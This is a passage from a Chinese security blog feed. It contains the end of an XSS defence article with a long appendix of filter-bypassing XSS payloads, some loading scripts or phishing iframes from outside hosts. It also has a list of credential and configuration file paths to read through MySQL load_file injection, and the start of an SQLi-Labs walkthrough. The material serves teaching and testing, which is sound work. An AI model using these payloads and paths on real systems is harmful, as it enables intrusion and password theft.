punctuation">:</span>pt<span class="token punctuation">:</span>javascript<span class="token punctuation">:</span></code></pre><p><strong>黑名单</strong>：<br>        过滤可能造成危害的符号及标签，发现使用者输入参数的值为<code>&lt; script&gt;xxx&lt; /script&gt;</code>就将其取代为空白。其优点是可以允许开发某些特殊HTML标签，确实是可能因过滤不干净而使攻击者绕过规则。<br><strong>白名单</strong>：<br>        白名单仅允许执行特定格式的语法，仅允许<code>&lt; img scr=“http://xxx” &gt;</code> 格式，其余格式一律取代为空白。其优点是可允许特定输入格式的HTML标签，确实是验证程序编写难度校高，且用户可输入变化减少。</p><h2 id="代码实体转义"><a href="#代码实体转义" class="headerlink" title="代码实体转义"></a>代码实体转义</h2><p>​        由于只保留文字部分是一劳永逸的，有时我们还需要展示这个标签，比如说程序论坛当中要贴一个代码，这个时候我们需要用一些转义，它会把这个大括号、小括号以及双引号做一个转义，做为一个字符，就无法执行这个标签型，后面加一个参数，但有时候单引号也会造成XSS。  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 把HTML实体标签转为符号，ENT_QUOTES指单引号也需要转义</span>$desc <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'desc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ENT_QUOTES<span class="token punctuation">)</span></code></pre><h2 id="httponly防止cookie被盗取"><a href="#httponly防止cookie被盗取" class="headerlink" title="httponly防止cookie被盗取"></a>httponly防止cookie被盗取</h2><p>​        一个信号当中有那么多的地方存在着这个输入以及检测的地方，可能就有一些地方漏掉，只要有一个地方漏掉了，用户的cookie信息就被盗取了。服务器在发送用户信息的时候，我们需要加上一个httponly，这个代码无法读取到cookie的信息，那么攻击者也是得不到这个信息，这对于用户来说也是非常好的保护。<br>​        比如说张三在我们网站上登陆了一下用户名，李四他特意发了一个攻击请求，他拿不到这个用户ID，就冒充不了这个张三。如果在Cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到Cookie信息，这样能有效的防止XSS攻击。<br>​        最重要的是：<font color="red">千万不要引入任何不可信的第三方JavaScript到页面里！  </font></p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="跨站语句大全"><a href="#跨站语句大全" class="headerlink" title="跨站语句大全"></a>跨站语句大全</h2><pre class=" language-javascript"><code class="language-javascript">'"<span class="token operator">></span><span class="token operator">&lt;</span>sCrIpT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">63252</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>sCrIpT<span class="token operator">></span>   大小写绕过<span class="token string">'">&lt;IFRAME SRC=javascript:alert('</span>XSXSSSs'<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>IFRAME<span class="token operator">></span><span class="token operator">&lt;</span>scr<span class="token operator">&lt;</span>script<span class="token operator">></span>ipt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XXSSSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scr<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>ipt<span class="token operator">></span>  过滤script绕过<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span>onerror<span class="token operator">=</span><span class="token string">"alert('xss')"</span><span class="token operator">></span>   直接k掉script绕过<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">eval</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span><span class="token function">fromcharcode</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>  <span class="token function">包含alert就绕过（括号一串数字是alert</span><span class="token punctuation">(</span>xss<span class="token punctuation">)</span>的ASCII值）<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>  构造js绕过<span class="token string">';alert('</span>xss<span class="token string">');'</span>   htmlentities没有过滤单引号，直接用单引号绕过。<span class="token operator">...</span><span class="token punctuation">.</span><span class="token operator">/</span>example8<span class="token punctuation">.</span>php<span class="token operator">/</span><span class="token punctuation">[</span><span class="token operator">/</span>url<span class="token punctuation">]</span><span class="token string">'>&lt;script>alert('</span>xss'<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> "<span class="token operator">&lt;</span>   当post 地址使用了当前url的时候，可这样绕过<span class="token operator">...</span><span class="token punctuation">.</span><span class="token operator">/</span>example9<span class="token punctuation">.</span>php#<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>  通过构造一个带xss的锚点绕过<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>br<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">0</span><span class="token function">dalert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">>=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>br<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>   过chrome默认xss过滤器http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">54.222</span><span class="token punctuation">.</span><span class="token number">168.105</span><span class="token punctuation">:</span><span class="token number">8065</span><span class="token operator">/</span><span class="token operator">?</span>error<span class="token operator">=</span>email<span class="token operator">%</span>E9<span class="token operator">%</span><span class="token number">94</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span>E8<span class="token operator">%</span>AF<span class="token operator">%</span>AF<span class="token operator">%</span>3C<span class="token operator">/</span>script<span class="token operator">%</span>3E<span class="token operator">%</span>3Cscript<span class="token operator">%</span><span class="token number">3E1</span><span class="token operator">%</span><span class="token number">3</span><span class="token function">C</span><span class="token punctuation">(</span>br<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">0</span><span class="token function">deval</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>3C<span class="token operator">/</span>script<span class="token operator">%</span>3E#xxxxxx<span class="token operator">%</span>22Onclick<span class="token operator">%</span><span class="token number">3</span><span class="token function">D</span><span class="token punctuation">(</span>outerHTML<span class="token operator">%</span>3DURL<span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">%</span>26quot#<span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span># onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>0D<span class="token operator">%</span>0Aalert<span class="token operator">%</span>28document<span class="token punctuation">.</span>cookie<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>2F<span class="token operator">%</span>2F<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"跨站"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>    <span class="token punctuation">(</span>最常用）<span class="token operator">&lt;</span>img scr<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"跨站"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>MyApp<span class="token punctuation">.</span>aspx<span class="token operator">?</span>myvar<span class="token operator">=</span> "<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>XSS<span class="token comment" spellcheck="true">/*-*/</span>STYLE<span class="token operator">=</span>xss<span class="token punctuation">:</span>e<span class="token comment" spellcheck="true">/**/</span><span class="token function">xpression</span><span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>IFRAME SRC<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>IFRAME<span class="token operator">></span><span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"<span class="token operator">&lt;</span>img scr<span class="token operator">=</span>"javascrip<span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token operator">&amp;</span>#<span class="token number">58</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/跨站/</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span><span class="token operator">&lt;</span>img scr<span class="token operator">=</span><span class="token string">"javas????cript:alert(/跨站/)"</span> width<span class="token operator">=</span><span class="token number">150</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">?</span>用tab键弄出来的空格）<span class="token operator">&lt;</span>img scr<span class="token operator">=</span><span class="token string">"#"</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/跨站/</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span><span class="token operator">&lt;</span>img scr<span class="token operator">=</span><span class="token string">"#"</span> style<span class="token operator">=</span><span class="token string">"xss:expression(alert(/xss/));"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span><span class="token operator">&lt;</span>img scr<span class="token operator">=</span><span class="token string">"#"</span><span class="token comment" spellcheck="true">/* */</span>onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span> width<span class="token operator">=</span><span class="token number">150</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span> <span class="token punctuation">(</span><span class="token comment" spellcheck="true">/**/</span> 表示注释）<span class="token operator">&lt;</span>img src<span class="token operator">=</span>vbscript<span class="token punctuation">:</span>msgbox <span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span><span class="token operator">&lt;</span>style<span class="token operator">></span> input <span class="token punctuation">{</span>left<span class="token punctuation">:</span>expression <span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">{</span>left<span class="token punctuation">:</span>expression <span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">{</span>left<span class="token punctuation">:</span>exp<span class="token comment" spellcheck="true">/* */</span>ression <span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">{</span>left<span class="token punctuation">:</span>\<span class="token number">0065</span>\0078ression <span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>html 实体 <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">{</span>left<span class="token punctuation">:</span><span class="token operator">&amp;</span>#ｘ<span class="token number">0065</span>；xpression <span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>unicode <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"{left:expRessioN (alert('xss'))}"</span><span class="token operator">></span><span class="token string">"]}%3Cscript%3Ealert('By b14ckb0y')%3C/script%3E{[&amp;item="</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>iframe<span class="token operator">%</span>20src<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token keyword">new</span><span class="token punctuation">.</span>qzone<span class="token punctuation">.</span>qq<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">9530772</span><span class="token operator">%</span>20width<span class="token operator">=</span><span class="token number">400</span><span class="token operator">%</span>20height<span class="token operator">=</span><span class="token number">600</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span class="token punctuation">[</span>"<span class="token operator">/</span>peixun<span class="token operator">/</span>Search<span class="token punctuation">.</span>asp<span class="token operator">?</span>Field<span class="token operator">=</span><span class="token operator">&amp;</span>Keyword<span class="token operator">=</span><span class="token operator">&amp;</span>ClassID<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>page<span class="token operator">=</span><span class="token number">2</span><span class="token operator">/</span>peixun<span class="token operator">/</span>Search<span class="token punctuation">.</span>asp<span class="token operator">?</span>Field<span class="token operator">=</span>'<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">451</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&amp;</span>Keyword<span class="token operator">=</span><span class="token operator">&amp;</span>ClassID<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>page<span class="token operator">=</span><span class="token number">2</span>Referer<span class="token punctuation">:</span> '"<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">312</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>  传送头插入<span class="token operator">/</span>peixun<span class="token operator">/</span>Search<span class="token punctuation">.</span>asp<span class="token operator">?</span>Field<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3E<span class="token operator">%</span>3Ciframe<span class="token operator">+</span>id<span class="token operator">%</span>3D445<span class="token operator">+</span>src<span class="token operator">%</span>3Dhttp<span class="token operator">%</span>3A<span class="token operator">%</span>2F<span class="token operator">%</span>2Fdemo<span class="token punctuation">.</span>testfire<span class="token punctuation">.</span>net<span class="token operator">%</span>2Fphishing<span class="token punctuation">.</span>html<span class="token operator">%</span>3E<span class="token operator">/</span>peixun<span class="token operator">/</span>Search<span class="token punctuation">.</span>asp<span class="token operator">?</span>Field<span class="token operator">=</span>'"<span class="token operator">></span><span class="token operator">&lt;</span>iframe id<span class="token operator">=</span><span class="token number">445</span> src<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>demo<span class="token punctuation">.</span>testfire<span class="token punctuation">.</span>net<span class="token operator">/</span>phishing<span class="token punctuation">.</span>html<span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://192.168.1.55:8080/xssing-master/?u=f389c3"</span> <span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;iframe src=http://www.baidu.com  width=0 height=0>&lt;/iframe>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span class="token operator">/</span>user<span class="token operator">/</span>User_Message<span class="token punctuation">.</span>asp<span class="token operator">?</span>Action<span class="token operator">=</span>Manage<span class="token operator">&amp;</span>ManageType<span class="token operator">=</span>Inbox<span class="token operator">&amp;</span>Field<span class="token operator">=</span>Content<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3e<span class="token operator">%</span>3c<span class="token operator">%</span><span class="token number">73</span><span class="token operator">%</span><span class="token number">43</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">70</span><span class="token operator">%</span><span class="token number">54</span><span class="token operator">%</span>3e<span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span>6c<span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">35</span><span class="token operator">%</span><span class="token number">38</span><span class="token operator">%</span><span class="token number">34</span><span class="token operator">%</span><span class="token number">38</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3c<span class="token operator">%</span>2f<span class="token operator">%</span><span class="token number">73</span><span class="token operator">%</span><span class="token number">43</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">70</span><span class="token operator">%</span><span class="token number">54</span><span class="token operator">%</span>3e <span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"Submit"</span> type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"保存修改结果"</span> onclick<span class="token operator">=</span><span class="token string">"alert(1)"</span><span class="token operator">/</span><span class="token operator">></span> <span class="token operator">&lt;</span> name<span class="token operator">=</span><span class="token string">"Submit"</span><span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token operator">/</span>netsearch_pre<span class="token punctuation">.</span>jsp<span class="token operator">?</span>netname<span class="token operator">=</span><span class="token number">1</span><span class="token string">" onmouseenter="</span><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token regex">/csits/</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token operator">%</span>0aX<span class="token operator">-</span>XSS<span class="token operator">-</span>Protection<span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>0a<span class="token operator">%</span>0d<span class="token operator">%</span>0a<span class="token operator">%</span>0d<span class="token operator">&lt;</span>img<span class="token operator">%</span>20src<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>20onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>edu<span class="token punctuation">.</span>gf<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn<span class="token operator">/</span>simulate<span class="token operator">?</span>type<span class="token operator">=</span>simulate_open<span class="token operator">&amp;</span>category<span class="token operator">=</span><span class="token operator">%</span>3Cimg<span class="token operator">%</span>20src<span class="token operator">=</span>@<span class="token operator">%</span>20onmouseover<span class="token operator">=</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token regex">/xssme27/</span><span class="token punctuation">)</span><span class="token operator">%</span>3E</code></pre>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入load_file函数常用路径[转]</title>
      <link href="/2020/10/25/mysql-zhu-ru-load-file-han-shu-chang-yong-lu-jing/"/>
      <url>/2020/10/25/mysql-zhu-ru-load-file-han-shu-chang-yong-lu-jing/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows下"><a href="#Windows下" class="headerlink" title="Windows下"></a>Windows下</h1><pre class=" language-bash"><code class="language-bash">c:/boot.ini //查看系统版本c:/windows/php.ini //php配置信息c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码c:/winnt/php.inic:/winnt/my.inic:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码c:\Program Files\Serv-U\ServUDaemon.inic:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此c:\Program Files\RhinoSoft.com\ServUDaemon.exeC:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件//存储了pcAnywhere的登陆密码c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf //查看linux系统配置的JSP虚拟主机d:\APACHE\Apache2\conf\httpd.confC:\Program Files\mysql\my.iniC:\mysql\data\mysql\user.MYD     //存储MYSQL系统中的用户密码</code></pre><h1 id="Linux-Unix下"><a href="#Linux-Unix下" class="headerlink" title="Linux/Unix下"></a>Linux/Unix下</h1><pre class=" language-bash"><code class="language-bash">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件/usr/local/apache2/conf/httpd.conf/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/usr/local/app/php5/lib/php.ini //PHP相关设置/etc/sysconfig/iptables //从中得到防火墙规则策略/etc/httpd/conf/httpd.conf // apache配置文件/etc/rsyncd.conf //同步程序配置文件/etc/my.cnf //mysql的配置文件/etc/redhat-release //系统版本/etc/issue/etc/issue.net/usr/local/app/php5/lib/php.ini //PHP相关设置/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf //查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf //针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //APASHE虚拟主机查看/etc/sysconfig/iptables //查看防火墙策略load_file<span class="token punctuation">(</span>char<span class="token punctuation">(</span>47<span class="token punctuation">))</span> //可以列出FreeBSD,Sunos系统根目录replace<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span>0×2F6574632F706173737764<span class="token punctuation">)</span>,0×3c,0×20<span class="token punctuation">)</span>replace<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span>char<span class="token punctuation">(</span>47,101,116,99,47,112,97,115,115,119,100<span class="token punctuation">))</span>,char<span class="token punctuation">(</span>60<span class="token punctuation">)</span>,char<span class="token punctuation">(</span>32<span class="token punctuation">))</span></code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noopener">MySQL注入load_file常用路径</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> MySQL </tag>
            
            <tag> load_file </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之GET-DoubleInjection-DoubleQuotes-String</title>
      <link href="/2020/10/19/sql-zhu-ru-zhi-get-doubleinjection-doublequotes-string/"/>
      <url>/2020/10/19/sql-zhu-ru-zhi-get-doubleinjection-doublequotes-string/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据库的任意操作。</p><p>&emsp;&emsp;SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、不回显查询结果、字符型注入。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>服务器系统：<code>Windows Server 2008</code></li><li>中间件：<code>IIS</code></li><li>数据库：<code>MySQL</code></li><li>客户机：<code>Windows 10</code></li><li>靶机：<code>SQLi-Labs</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/实验界面.png" alt="实验界面"></center><h1 id="0x03-实验工具"><a href="#0x03-实验工具" class="headerlink" title="0x03 实验工具"></a>0x03 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x04-注入步骤"><a href="#0x04-注入步骤" class="headerlink" title="0x04 注入步骤"></a>0x04 注入步骤</h1><ol><li><strong>注入点判断</strong>。判断测试点是否存在SQL注入漏洞。</li><li><strong>注入类型判断</strong>。主要是判断注入点位置使用的SQL语句格式，若单引号未被过滤或转义，且回显报错信息，则使用单引号可以快速判断出注入类型。</li><li><strong>判断SQL语句中的列数</strong>。注入点正常显示的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或<code>报错</code>等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道此位置的SQL语句中的列数，否则SQL执行时会发生错误。</li><li><strong>判断SQL语句操作的回显</strong>。判断SQL回显主要是通过对比来判断。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来；使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到类似的回显，报错注入可以根据对比不同payload操作结果的对比来判断。但当该位置不存在回显信息或回显的错误信息被屏蔽时，我们可以采用对比响应的时候来判断回显，基于时间的盲注即采取这种方式。</li><li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到<code>数据库用户名</code>、<code>版本</code>、<code>数据库名称</code>等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li><li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li><li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li><li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li></ol><h1 id="0x05-实验步骤"><a 